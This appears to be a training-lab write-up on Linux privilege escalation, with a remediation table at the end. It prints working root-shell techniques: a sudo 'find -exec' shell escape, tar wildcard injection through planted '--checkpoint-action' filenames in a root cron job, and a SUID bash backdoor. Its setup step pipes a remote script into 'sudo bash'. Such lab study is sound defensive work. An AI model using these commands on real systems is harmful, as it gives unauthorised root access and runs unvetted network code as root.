<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>S23 — Privilege Escalation Report</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0b0e13;
    --bg2: #111620;
    --bg3: #171d2b;
    --border: rgba(255,255,255,0.07);
    --green: #39e08b;
    --green-dim: rgba(57,224,139,0.12);
    --amber: #f5a623;
    --amber-dim: rgba(245,166,35,0.12);
    --red: #ff5e5e;
    --red-dim: rgba(255,94,94,0.1);
    --blue: #4fc3f7;
    --blue-dim: rgba(79,195,247,0.1);
    --text: #c9d1e0;
    --text-muted: #5c6577;
    --text-bright: #eef1f7;
    --mono: 'JetBrains Mono', monospace;
    --sans: 'Syne', sans-serif;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--sans);
    font-size: 15px;
    line-height: 1.7;
    min-height: 100vh;
  }

  /* Scanline overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,0,0,0.03) 2px,
      rgba(0,0,0,0.03) 4px
    );
    pointer-events: none;
    z-index: 100;
  }

  .page {
    max-width: 860px;
    margin: 0 auto;
    padding: 60px 32px 100px;
  }

  /* ── HEADER ── */
  .header {
    border-bottom: 1px solid var(--border);
    padding-bottom: 40px;
    margin-bottom: 56px;
    position: relative;
  }

  .header-eyebrow {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 0.18em;
    text-transform: uppercase;
    color: var(--green);
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .header-eyebrow::before {
    content: '';
    display: inline-block;
    width: 28px;
    height: 1px;
    background: var(--green);
  }

  h1 {
    font-family: var(--sans);
    font-size: clamp(36px, 5vw, 54px);
    font-weight: 800;
    color: var(--text-bright);
    letter-spacing: -0.03em;
    line-height: 1.1;
    margin-bottom: 20px;
  }

  h1 span { color: var(--green); }

  .header-meta {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-top: 24px;
  }

  .badge {
    font-family: var(--mono);
    font-size: 11px;
    padding: 4px 12px;
    border-radius: 3px;
    letter-spacing: 0.06em;
  }

  .badge-green { background: var(--green-dim); color: var(--green); border: 1px solid rgba(57,224,139,0.2); }
  .badge-amber { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(245,166,35,0.2); }
  .badge-blue  { background: var(--blue-dim);  color: var(--blue);  border: 1px solid rgba(79,195,247,0.2); }

  /* ── SECTION ── */
  .section {
    margin-bottom: 56px;
    opacity: 0;
    transform: translateY(18px);
    animation: fadeUp 0.5s ease forwards;
  }

  .section:nth-child(1) { animation-delay: 0.1s; }
  .section:nth-child(2) { animation-delay: 0.2s; }
  .section:nth-child(3) { animation-delay: 0.3s; }
  .section:nth-child(4) { animation-delay: 0.4s; }
  .section:nth-child(5) { animation-delay: 0.5s; }

  @keyframes fadeUp {
    to { opacity: 1; transform: translateY(0); }
  }

  .section-header {
    display: flex;
    align-items: center;
    gap: 14px;
    margin-bottom: 24px;
  }

  .phase-num {
    font-family: var(--mono);
    font-size: 11px;
    font-weight: 700;
    width: 32px;
    height: 32px;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }

  .num-green { background: var(--green-dim); color: var(--green); border: 1px solid rgba(57,224,139,0.25); }
  .num-amber { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(245,166,35,0.25); }
  .num-red   { background: var(--red-dim);   color: var(--red);   border: 1px solid rgba(255,94,94,0.2); }
  .num-blue  { background: var(--blue-dim);  color: var(--blue);  border: 1px solid rgba(79,195,247,0.2); }

  h2 {
    font-family: var(--sans);
    font-size: 20px;
    font-weight: 700;
    color: var(--text-bright);
    letter-spacing: -0.02em;
  }

  .section-sub {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--text-muted);
    letter-spacing: 0.08em;
    text-transform: uppercase;
    margin-left: auto;
  }

  /* ── CARD ── */
  .card {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 8px;
    overflow: hidden;
  }

  /* ── STEPS ── */
  .steps { display: flex; flex-direction: column; }

  .step {
    display: grid;
    grid-template-columns: 48px 1fr;
    border-bottom: 1px solid var(--border);
  }

  .step:last-child { border-bottom: none; }

  .step-num {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--text-muted);
    padding: 20px 0 20px 20px;
    display: flex;
    align-items: flex-start;
    padding-top: 22px;
  }

  .step-body { padding: 18px 20px 18px 8px; }

  .step-label {
    font-size: 13px;
    font-weight: 600;
    color: var(--text-bright);
    margin-bottom: 8px;
    letter-spacing: 0.01em;
  }

  .step p {
    font-size: 13.5px;
    color: var(--text);
    margin-bottom: 10px;
    line-height: 1.65;
  }

  .step p:last-child { margin-bottom: 0; }

  /* ── CODE BLOCKS ── */
  .code-block {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 6px;
    overflow: hidden;
    margin: 10px 0;
  }

  .code-bar {
    display: flex;
    align-items: center;
    padding: 7px 14px;
    border-bottom: 1px solid var(--border);
    gap: 8px;
  }

  .code-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--border);
  }

  .code-label {
    font-family: var(--mono);
    font-size: 10px;
    color: var(--text-muted);
    letter-spacing: 0.1em;
    text-transform: uppercase;
    margin-left: 4px;
  }

  pre {
    font-family: var(--mono);
    font-size: 12.5px;
    color: #a8d8a8;
    padding: 14px 18px;
    overflow-x: auto;
    line-height: 1.7;
    white-space: pre;
  }

  .comment { color: var(--text-muted); }
  .cmd     { color: #a8d8a8; }
  .flag    { color: var(--amber); }
  .path    { color: var(--blue); }
  .output  { color: var(--green); }

  /* ── INSIGHT BOX ── */
  .insight {
    display: flex;
    gap: 14px;
    padding: 16px 18px;
    border-radius: 6px;
    margin-top: 12px;
    font-size: 13px;
    line-height: 1.65;
  }

  .insight-green { background: var(--green-dim); border: 1px solid rgba(57,224,139,0.2); color: var(--text); }
  .insight-amber { background: var(--amber-dim); border: 1px solid rgba(245,166,35,0.2); color: var(--text); }

  .insight-icon {
    font-size: 15px;
    flex-shrink: 0;
    margin-top: 1px;
  }

  /* ── TABLE ── */
  .table-wrap { overflow-x: auto; }

  table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
  }

  thead tr {
    border-bottom: 1px solid var(--border);
  }

  th {
    font-family: var(--mono);
    font-size: 10px;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--text-muted);
    padding: 12px 16px;
    text-align: left;
    font-weight: 400;
  }

  td {
    padding: 13px 16px;
    border-bottom: 1px solid var(--border);
    vertical-align: top;
    line-height: 1.55;
  }

  tr:last-child td { border-bottom: none; }

  td:first-child { color: var(--amber); font-family: var(--mono); font-size: 12px; }
  td:nth-child(2) { color: var(--text); }
  td:last-child { color: var(--text-muted); font-size: 12.5px; }

  /* ── TOOLS ── */
  .tools-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
    gap: 10px;
  }

  .tool-card {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 14px 16px;
    transition: border-color 0.2s;
  }

  .tool-card:hover { border-color: rgba(255,255,255,0.15); }

  .tool-name {
    font-family: var(--mono);
    font-size: 12px;
    color: var(--green);
    margin-bottom: 5px;
    font-weight: 600;
  }

  .tool-desc {
    font-size: 12px;
    color: var(--text-muted);
    line-height: 1.5;
  }

  /* ── DIVIDER ── */
  .divider {
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--border) 20%, var(--border) 80%, transparent);
    margin: 8px 0 32px;
  }

  hr { display: none; }
</style>
</head>
<body>
<div class="page">

  <!-- HEADER -->
  <header class="header section">
    <div class="header-eyebrow">Session 23 &mdash; Week 8</div>
    <h1>Climbing the <span>Ladder</span></h1>
    <p style="color:var(--text-muted);font-size:14px;max-width:520px;">Vertical privilege escalation on a TitanCorp development server — from restricted shell to root using two independent attack chains.</p>
    <div style="margin-top:20px;font-family:var(--mono);font-size:12px;color:var(--text-muted);">
      Engineer: <span style="color:var(--text-bright)">Mohammed Adamu</span>
    </div>
    <div class="header-meta">
      <span class="badge badge-green">Linux PrivEsc</span>
      <span class="badge badge-amber">Cron Injection</span>
      <span class="badge badge-blue">Sudo Abuse</span>
    </div>
  </header>

  <!-- SETUP -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-blue">P0</div>
      <h2>Environment Provisioning</h2>
    </div>
    <div class="card">
      <div class="steps">
        <div class="step">
          <div class="step-num">01</div>
          <div class="step-body">
            <div class="step-label">Run the provisioning script inside the Ubuntu VM</div>
            <p>Before anything else, this command was run to set up the vulnerable user account, download the required enumeration tools, and seed the artifact template.</p>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">curl <span class="flag">-sL</span> <span class="path">https://gist.githubusercontent.com/grobbins-cell/e19d720f62ba447b9e520e63dc734abd/raw/s23_provision.sh</span> | sudo bash</span></pre>
            </div>
            <div class="insight insight-green">
              <span class="insight-icon">✓</span>
              <span>Provisioning completed successfully — confirmed by the <strong style="color:var(--green)">[+] PROVISIONING COMPLETE</strong> message before proceeding to Phase 1.</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- PHASE 1 -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-green">P1</div>
      <h2>Sudo Abuse — GTFOBins: <code style="font-family:var(--mono);font-size:16px;color:var(--green)">find</code></h2>

    </div>
    <div class="card">
      <div class="steps">

        <div class="step">
          <div class="step-num">01</div>
          <div class="step-body">
            <div class="step-label">Switch into the restricted account</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">su - limited_user</span>
<span class="comment"># Password: titan123</span></pre>
            </div>
          </div>
        </div>

        <div class="step">
          <div class="step-num">02</div>
          <div class="step-body">
            <div class="step-label">Enumerate sudo permissions</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">sudo <span class="flag">-l</span></span>
<span class="comment"># Result: (root) NOPASSWD: /usr/bin/find</span></pre>
            </div>
            <p>The sudoers file allows <code style="font-family:var(--mono);font-size:12px;color:var(--amber)">limited_user</code> to run <code style="font-family:var(--mono);font-size:12px;color:var(--amber)">/usr/bin/find</code> as root with no password prompt — a classic misconfiguration.</p>
          </div>
        </div>

        <div class="step">
          <div class="step-num">03</div>
          <div class="step-body">
            <div class="step-label">Exploit <code style="font-family:var(--mono);color:var(--green)">find</code>'s <code style="font-family:var(--mono);color:var(--amber)">-exec</code> flag to spawn a root shell</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">sudo find . <span class="flag">-exec</span> <span class="path">/bin/sh</span> <span class="flag">-p</span> \; <span class="flag">-quit</span></span></pre>
            </div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">output</span></div>
              <pre><span class="cmd">whoami</span>
<span class="output">root</span></pre>
            </div>
            <div class="insight insight-green">
              <span class="insight-icon">⚡</span>
              <span><strong style="color:var(--green)">Why it works:</strong> <code style="font-family:var(--mono);font-size:12px">find</code>'s <code style="font-family:var(--mono);font-size:12px">-exec</code> flag runs arbitrary commands. When the binary itself runs as root via sudo, any spawned subprocess inherits that privilege. Documented on <strong>GTFOBins</strong>.</span>
            </div>
          </div>
        </div>

      </div>
    </div>
  </section>

  <!-- PHASE 2 -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-amber">P2</div>
      <h2>Automated Enumeration — LinPEAS</h2>

    </div>
    <div class="card">
      <div class="steps">

        <div class="step">
          <div class="step-num">01</div>
          <div class="step-body">
            <div class="step-label">Run the enumeration script</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">cd <span class="path">~/Linux_PrivEsc/</span>
./linpeas.sh</span></pre>
            </div>
          </div>
        </div>

        <div class="step">
          <div class="step-num">02</div>
          <div class="step-body">
            <div class="step-label">Key finding — root-owned cron job</div>
            <p>In the <strong style="color:var(--text-bright)">Cron Jobs</strong> section (highlighted RED/YELLOW), LinPEAS revealed a script running every 60 seconds as root:</p>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">crontab</span></div>
              <pre><span class="comment"># /usr/local/bin/backup.sh — runs as root every minute</span>
<span class="cmd">* * * * * root <span class="path">/usr/local/bin/backup.sh</span></span></pre>
            </div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">backup.sh contents</span></div>
              <pre><span class="cmd">tar <span class="flag">-cf</span> <span class="path">/tmp/backup.tar</span> <span class="flag">*</span></span>
<span class="comment"># ^ unquoted wildcard in a user-writable directory</span></pre>
            </div>
            <div class="insight insight-amber">
              <span class="insight-icon">⚠</span>
              <span><strong style="color:var(--amber)">Vulnerability:</strong> The bare <code style="font-family:var(--mono);font-size:12px">*</code> expands filenames in <code style="font-family:var(--mono);font-size:12px">/home/limited_user/backups/</code> — a directory we control. Filenames beginning with <code style="font-family:var(--mono);font-size:12px">--</code> are parsed by <code style="font-family:var(--mono);font-size:12px">tar</code> as command-line flags.</span>
            </div>
          </div>
        </div>

      </div>
    </div>
  </section>

  <!-- PHASE 3 -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-red">P3</div>
      <h2>Cron Job Wildcard Injection</h2>

    </div>
    <div class="card">
      <div class="steps">

        <div class="step">
          <div class="step-num">01</div>
          <div class="step-body">
            <div class="step-label">Enter the target directory</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">cd <span class="path">/home/limited_user/backups</span></span></pre>
            </div>
          </div>
        </div>

        <div class="step">
          <div class="step-num">02</div>
          <div class="step-body">
            <div class="step-label">Create the malicious payload</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">echo <span class="output">'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'</span> > runme.sh</span></pre>
            </div>
            <p>This script — when executed as root — copies <code style="font-family:var(--mono);font-size:12px;color:var(--blue)">/bin/bash</code> to <code style="font-family:var(--mono);font-size:12px;color:var(--blue)">/tmp/rootbash</code> and sets the SUID bit, making it a persistent root shell.</p>
          </div>
        </div>

        <div class="step">
          <div class="step-num">03</div>
          <div class="step-body">
            <div class="step-label">Plant the "flag" files that poison the wildcard</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash</span></div>
              <pre><span class="cmd">touch ./<span class="flag">"--checkpoint=1"</span>
touch ./<span class="flag">"--checkpoint-action=exec=sh runme.sh"</span></span></pre>
            </div>
            <p>When <code style="font-family:var(--mono);font-size:12px;color:var(--amber)">tar *</code> expands, these filenames are parsed as CLI flags — triggering execution of <code style="font-family:var(--mono);font-size:12px;color:var(--amber)">runme.sh</code> under the root context.</p>
          </div>
        </div>

        <div class="step">
          <div class="step-num">04</div>
          <div class="step-body">
            <div class="step-label">Wait for the cron job, then seize the shell</div>
            <div class="code-block">
              <div class="code-bar"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div><span class="code-label">bash — after ~60 seconds</span></div>
              <pre><span class="cmd">ls <span class="flag">-l</span> <span class="path">/tmp/rootbash</span></span>
<span class="output">-rwsr-sr-x 1 root root ... /tmp/rootbash</span>

<span class="cmd">/tmp/rootbash <span class="flag">-p</span></span>

<span class="cmd">id</span>
<span class="output">uid=1001(limited_user) gid=1001(limited_user) euid=0(root) ...</span></pre>
            </div>
            <div class="insight insight-green">
              <span class="insight-icon">✓</span>
              <span><strong style="color:var(--green)">Root achieved.</strong> The SUID binary runs with an effective UID of 0 regardless of who invokes it. The <code style="font-family:var(--mono);font-size:12px">-p</code> flag preserves that elevated privilege in the spawned shell.</span>
            </div>
          </div>
        </div>

      </div>
    </div>
  </section>

  <!-- FINDINGS TABLE -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-blue">⚑</div>
      <h2>Key Takeaways</h2>
    </div>
    <div class="card table-wrap">
      <table>
        <thead>
          <tr>
            <th>Technique</th>
            <th>Root Cause</th>
            <th>Remediation</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>sudo find abuse</td>
            <td>Overly permissive sudoers entry grants root execution of a GTFOBins binary</td>
            <td>Remove <code style="font-family:var(--mono);font-size:11px">find</code> from sudoers; apply least-privilege</td>
          </tr>
          <tr>
            <td>Cron wildcard injection</td>
            <td>Unquoted <code style="font-family:var(--mono);font-size:11px">tar *</code> in a user-writable directory run by root cron</td>
            <td>Use absolute paths: <code style="font-family:var(--mono);font-size:11px">tar -cf /tmp/b.tar /home/limited_user/backups/</code></td>
          </tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- TOOLS -->
  <section class="section">
    <div class="section-header">
      <div class="phase-num num-green">⚙</div>
      <h2>Tools Used</h2>
    </div>
    <div class="tools-grid">
      <div class="tool-card">
        <div class="tool-name">sudo -l</div>
        <div class="tool-desc">Enumerate allowed sudo commands for the current user</div>
      </div>
      <div class="tool-card">
        <div class="tool-name">LinPEAS</div>
        <div class="tool-desc">Automated Linux privilege escalation enumeration script</div>
      </div>
      <div class="tool-card">
        <div class="tool-name">GTFOBins</div>
        <div class="tool-desc">Reference for abusing legitimate Unix binaries</div>
      </div>
      <div class="tool-card">
        <div class="tool-name">tar injection</div>
        <div class="tool-desc">Wildcard-based cron job exploitation via flag filename spoofing</div>
      </div>
    </div>
  </section>

</div>
</body>
</html>
